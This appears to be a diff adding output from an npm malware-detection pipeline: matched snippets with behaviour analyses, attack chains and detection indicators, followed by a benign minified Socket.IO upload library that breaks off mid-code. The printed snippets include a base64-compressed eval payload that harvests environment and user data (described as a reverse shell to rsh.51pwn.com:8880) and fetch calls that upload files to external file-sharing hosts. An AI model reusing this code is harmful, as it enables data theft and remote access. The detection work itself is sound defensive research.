+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4881761074066162,
+              "code_similarity": 0.5157098770141602,
+              "behavior_similarity": 0.46064233779907227,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_068589_snippet_4",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47648853063583374,
+              "code_similarity": 0.38170865178108215,
+              "behavior_similarity": 0.5712683796882629,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "// Similar pattern for other services\nfetch('https://catbox.moe/user/api.php', { method: 'POST', body: formData })\nfetch('https://pomf2.lain.la/upload.php', { method: 'POST', body: formData })\nfetch('https://upload.uploadcare.com/base/', { method: 'POST', body: formData })\nfetch('https://tmpfiles.org/api/v1/upload', { method: 'POST', body: formData })\nfetch('https://itzpire.site/tools/upload', { method: 'POST', body: formData })\nfetch('https://skizo.tech/api/upload', { method: 'POST', body: formData })",
+                "code_behavior": "At runtime, the code sends HTTP POST requests with file data as form-data to multiple hardcoded file-sharing endpoints, enabling mass exfiltration of files to attacker-controlled services without user awareness.",
+                "malice_analysis": {
+                  "why_suspicious": "Uploading files to a wide array of suspicious, hardcoded endpoints is a clear sign of mass data exfiltration and coordinated exfiltration attempts.",
+                  "violated_expectations": "A WhatsApp automation package should not interact with unrelated file-sharing services or perform bulk uploads to external domains.",
+                  "similar_legitimate_use": "Bulk uploaders or backup tools may contact multiple endpoints, but not in this context and never without user consent.",
+                  "key_indicators": [
+                    "Multiple hardcoded exfiltration endpoints",
+                    "Automated, silent network activity to file-sharing domains",
+                    "No user interaction or notification before upload"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (deobfuscated JavaScript)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_787969_snippet_1",
+              "source_package": "express-fileupload (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_787969/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4763041138648987,
+              "code_similarity": 0.40039223432540894,
+              "behavior_similarity": 0.5522159934043884,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "app.use(fileUpload({ parseNested: true }));",
+                "code_behavior": "At runtime, when handling HTTP file uploads, the code enables the 'parseNested' option, causing uploaded form data to be recursively parsed and assigned to nested object properties, including special properties like '__proto__', resulting in prototype pollution.",
+                "malice_analysis": {
+                  "why_suspicious": "Enabling 'parseNested' without input sanitization allows user-supplied data to modify object prototypes, creating a classic prototype pollution vulnerability.",
+                  "violated_expectations": "Normal file upload handling should not allow user input to affect global object prototypes or application logic; user data should be isolated from core JavaScript object structures.",
+                  "similar_legitimate_use": "Nested parsing is legitimate for complex form data structures, but must be implemented with strict sanitization to prevent prototype pollution.",
+                  "key_indicators": [
+                    "parseNested: true without input sanitization",
+                    "Direct assignment of user data to object keys, including '__proto__'"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when handling HTTP file uploads)",
+                  "file_location": "application code where express-fileupload is initialized with parseNested: true",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "express-fileupload",
+                  "package_manager": "npm",
+                  "package_versions": "all versions < 1.1.9 (CVE-2020-7699)",
+                  "why_malicious": "The package contains a critical security flaw in its 'parseNested' option, which allows prototype pollution by recursively parsing and assigning user-supplied form data to object properties, including special properties like '__proto__'. This enables attackers to corrupt global object prototypes, potentially leading to denial-of-service (DoS) or, in certain configurations, remote code execution (RCE) through manipulation of downstream libraries."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends a crafted HTTP multipart/form-data request with a field named '__proto__.toString' or another prototype property.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Prototype pollution in the application"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The express-fileupload module with parseNested: true parses the request and assigns the malicious property to Object.prototype.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Global object prototype is polluted"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Application logic or downstream libraries (such as EJS) are affected by the polluted prototype, potentially leading to denial-of-service or remote code execution.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Denial-of-service or remote shell access"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "HTTP multipart/form-data requests with field names containing '__proto__' or other prototype properties",
+                    "Unexpected modification of Object.prototype properties at runtime",
+                    "Application errors (HTTP 500) or crashes after file upload with parseNested enabled",
+                    "Unusual behavior in downstream libraries (e.g., EJS) following file uploads"
+                  ],
+                  "file_indicators": [
+                    "Usage of app.use(fileUpload({ parseNested: true })) in application code",
+                    "Presence of form fields named '__proto__', '__proto__.toString', or similar in upload requests"
+                  ],
+                  "network_indicators": [
+                    "Inbound HTTP requests with multipart/form-data and suspicious field names targeting prototype properties",
+                    "Outbound connections from Node.js processes (e.g., if a reverse shell is triggered after file upload)"
+                  ],
+                  "how_to_detect": "Monitor HTTP multipart/form-data requests for field names such as '__proto__', '__proto__.toString', or other prototype properties. Audit application code for use of express-fileupload with parseNested: true. Watch for unexpected changes to Object.prototype or frequent HTTP 500 errors after file uploads. In environments using EJS or similar templating engines, monitor for unexpected child_process execution or outbound network connections from the application process, which may indicate remote code execution."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_068589_snippet_2",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4718441963195801,
+              "code_similarity": 0.35273098945617676,
+              "behavior_similarity": 0.5909574031829834,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "telegraPh: async (_0x3d2eed) => {\n  try {\n    const { ext: _0xa852ef } = await fromBuffer(_0x3d2eed),\n      _0x4e049a = await createFormData(_0x3d2eed, 'file', _0xa852ef),\n      _0x50070e = await fetch('https://telegra.ph/upload', {\n        method: 'POST',\n        body: _0x4e049a,\n      }),\n      _0x6354d9 = await _0x50070e.json();\n    if (_0x6354d9.error) {\n      throw _0x6354d9.error;\n    }\n    return 'https://telegra.ph' + _0x6354d9[0].src;\n  } catch (_0x574189) {\n    throw false;\n  }\n}",
+                "code_behavior": "At runtime, the code uploads arbitrary file data to https://telegra.ph/upload via HTTP POST, sending the file as form-data and returning the resulting URL, enabling silent exfiltration of user files.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated file uploads to external services without user interaction are a hallmark of data exfiltration and are not justified in the context of WhatsApp automation.",
+                  "violated_expectations": "A WhatsApp automation package should not upload arbitrary files to third-party file-sharing services, especially without user notification or consent.",
+                  "similar_legitimate_use": "A legitimate file-sharing client or backup tool may upload files, but only with user consent and clear intent.",
+                  "key_indicators": [
+                    "Hardcoded upload endpoint (telegra.ph)",
+                    "No user notification or consent before upload",
+                    "Automated network exfiltration of file data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (deobfuscated JavaScript)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/socketio-file-upload/0.7.3/package/client.min.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "client.min_slice_1",
+          "code_snippet": "/* Socket IO File Upload Client-Side Library\n *   Copyright (C) 2015 Shane Carr and others\n *   Released under the X11 License\n * For more information, visit: https://github.com/sffc/socketio-file-upload\n */\nvar $jscomp=$jscomp||{};$jscomp.scope={};$jscomp.owns=function(c,f){return Object.prototype.hasOwnProperty.call(c,f)};$jscomp.assign=\"function\"==typeof Object.assign?Object.assign:function(c,f){for(var b=1;b<arguments.length;b++){var d=arguments[b];if(d)for(var e in d)$jscomp.owns(d,e)&&(c[e]=d[e])}return c};$jscomp.ASSUME_ES5=!1;$jscomp.ASSUME_NO_NATIVE_MAP=!1;$jscomp.ASSUME_NO_NATIVE_SET=!1;\n$jscomp.defineProperty=$jscomp.ASSUME_ES5||\"function\"==typeof Object.defineProperties?Object.defineProperty:function(c,f,b){c!=Array.prototype&&c!=Object.prototype&&(c[f]=b.value)};$jscomp.getGlobal=function(c){return\"undefined\"!=typeof window&&window===c?c:\"undefined\"!=typeof global&&null!=global?global:c};$jscomp.global=$jscomp.getGlobal(this);\n$jscomp.polyfill=function(c,f,b,d){if(f){b=$jscomp.global;c=c.split(\".\");for(d=0;d<c.length-1;d++){var e=c[d];e in b||(b[e]={});b=b[e]}c=c[c.length-1];d=b[c];f=f(d);f!=d&&null!=f&&$jscomp.defineProperty(b,c,{configurable:!0,writable:!0,value:f})}};$jscomp.polyfill(\"Object.assign\",function(c){return c||$jscomp.assign},\"es6\",\"es3\");\n(function(c,f,b){\"function\"===typeof define&&define.amd?define([],b):\"object\"===typeof module&&module.exports?module.exports=b():c[f]=b()})(this,\"SocketIOFileUpload\",function(){return function(c,f){var b=this;if(!window.File||!window.FileReader)throw Error(\"Socket.IO File Upload: Browser Not Supported\");window.siofu_global||(window.siofu_global={instances:0,downloads:0});var d={},e={},A={},z={},l={},h=function(a,b){return f?f[a]||b:b};b.fileInputElementId=\"siofu_input_\"+window.siofu_global.instances++;\nb.resetFileInputs=!0;b.useText=h(\"useText\",!1);b.serializedOctets=h(\"serializedOctets\",!1);b.useBuffer=h(\"useBuffer\",!0);b.chunkSize=h(\"chunkSize\",102400);b.topicName=h(\"topicName\",\"siofu\");b.wrapData=h(\"wrapData\",!1);var E=function(){return\"boolean\"===typeof b.wrapData?!0:\"object\"===typeof b.wrapData&&!Array.isArray(b.wrapData)&&b.wrapData.wrapKey&&\"string\"===typeof b.wrapData.wrapKey.action&&\"string\"===typeof b.wrapData.wrapKey.message&&b.wrapData.unwrapKey&&\"string\"===typeof b.wrapData.unwrapKey.action&&\n\"string\"===typeof b.wrapData.unwrapKey.message?!0:!1};b.exposePrivateFunction=h(\"exposePrivateFunction\",!1);var m=function(a){return b.wrapData?b.topicName:b.topicName+a},x=function(a,g){if(!E()||!b.wrapData)return a;var c={};b.wrapData.additionalData&&Object.assign(c,b.wrapData.additionalData);var d=b.wrapData.wrapKey&&\"string\"===typeof b.wrapData.wrapKey.message?b.wrapData.wrapKey.message:\"message\";c[b.wrapData.wrapKey&&\"string\"===typeof b.wrapData.wrapKey.action?b.wrapData.wrapKey.action:\"action\"]=\ng;c[d]=a;return c},v=function(a,g){var c=document.createEvent(\"Event\");c.initEvent(a,!1,!1);for(var d in g)g.hasOwnProperty(d)&&(c[d]=g[d]);return b.dispatchEvent(c)},u=[],k=function(a,b,c,d){a.addEventListener(b,c,d);u.push(arguments)},B=function(a,b,c,d){a.removeEventListener&&a.removeEventListener(b,c,d)},H=function(){for(var a=u.length-1;0<=a;a--)B.apply(this,u[a]);u=[]},I=function(a){if(null!==b.maxFileSize&&a.size>b.maxFileSize)v(\"error\",{file:a,message:\"Attempt by client to upload file exceeding the maximum file size\",\ncode:1});else if(v(\"start\",{file:a})){var g=new FileReader,d=window.siofu_global.downloads++,f=!1,h=b.useText,l=0,u;g._realReader&&(g=g._realReader);e[d]=a;var w={id:d},y=b.chunkSize;if(y>=a.size||0>=y)y=a.size;var p=function(){if(!w.abort){var b=a.slice(l,Math.min(l+y,a.size));h?g.readAsText(b):g.readAsArrayBuffer(b)}},q=function(e){if(!w.abort){var F=Math.min(l+y,a.size);a:{var k=l;e=e.target.result;var q=!1;if(!h)try{var r=new Uint8Array(e);if(b.serializedOctets)e=r;else if(b.useBuffer)e=r.buffer;\nelse{q=!0;var t,p=r.buffer.byteLength,n=\"\";for(t=0;t<p;t+=3)n+=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[r[t]>>2],n+=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[(r[t]&3)<<4|r[t+1]>>4],n+=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[(r[t+1]&15)<<2|r[t+2]>>6],n+=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[r[t+2]&63];2===p%3?n=n.substring(0,n.length-1)+\"=\":1===p%3&&(n=n.substring(0,n.length-2)+\"==\");e=n}}catch(K){c.emit(m(\"_done\"),\nx({id:d,interrupt:!0},\"done\"));break a}c.emit(m(\"_progress\"),x({id:d,size:a.size,start:k,end:F,content:e,base64:q},\"progress\"))}v(\"progress\",{file:a,bytesLoaded:F,name:u});l+=y;l>=a.size&&(c.emit(m(\"_done\"),x({id:d},\"done\")),v(\"load\",{file:a,reader:g,name:u}),f=!0)}};k(g,\"load\",q);k(g,\"error\",function(){c.emit(m(\"_done\"),x({id:d,interrupt:!0},\"done\"));B(g,\"load\",q)});k(g,\"abort\",function(){c.emit(m(\"_done\"),x({id:d,interrupt:!0},\"done\"));B(g,\"load\",q)});c.emit(m(\"_start\"),x({name:a.name,mtime:a.lastModified,\nmeta:a.meta,size:a.size,encoding:h?\"text\":\"octet\",id:d},\"start\"));z[d]=function(a){u=a;p()};A[d]=function(){f||p()};return w}},w=function(a){if(0!==a.length){for(var b=0;b<a.length;b++)a[b].meta||(a[b].meta={});if(v(\"choose\",{files:a}))for(b=0;b<a.length;b++){var c=I(a[b]);l[c.id]=c}}},p=function(a){var c=a.target.files||a.dataTransfer.files;a.preventDefault();w(c);if(b.resetFileInputs){try{a.target.value=\"\"}catch(J){}if(a.target.value){c=document.createElement(\"form\");var d=a.target.parentNode,e=\na.target.nextSibling;c.appendChild(a.target);c.reset();d.insertBefore(a,target,e)}}};this.submitFiles=function(a){a&&w(a)};this.listenOnSubmit=function(a,b){b.files&&k(a,\"click\",function(){w(b.files)},!1)};this.listenOnArraySubmit=function(a,b){for(var c in b)this.listenOnSubmit(a,b[c])};this.listenOnInput=function(a){a.files&&k(a,\"change\",p,!1)};this.listenOnDrop=function(a){k(a,\"dragover\",function(a){a.preventDefault()},!1);k(a,\"drop\",p)};this.prompt=function(){var a=document.getElementById(b.fileInputElementId);\na||(a=document.createElement(\"input\"),a.setAttribute(\"type\",\"file\"),a.setAttribute(\"id\",b.fileInputElementId),a.style.display=\"none\",document.body.appendChild(a));k(a,\"change\",p,!1);var c=document.createEvent(\"MouseEvents\");c.initMouseEvent(\"click\",!0,!0,window,0,0,0,0,0,!1,!1,!1,!1,0,null);a.dispatchEvent(c)};this.destroy=function(){H();var a=document.getElementById(b.fileInputElementId);a&&a.parentNode.removeChild(a);for(var c in l)l.hasOwnProperty(c)&&(l[c].abort=!0);l=z=e=d=null};this.addEventListener=\nfunction(a,b){d[a]||(d[a]=[]);d[a].push(b)};this.removeEventListener=function(a,b){if(!d[a])return!1;for(var c=0;c<d[a].length;c++)if(d[a][c]===b)return d[a].splice(c,1),!0;return!1};this.dispatchEvent=function(a){var b=d[a.type];if(!b)return!0;for(var c=!0,e=0;e<b.length;e++)!1===b[e](a)&&(c=!1);return 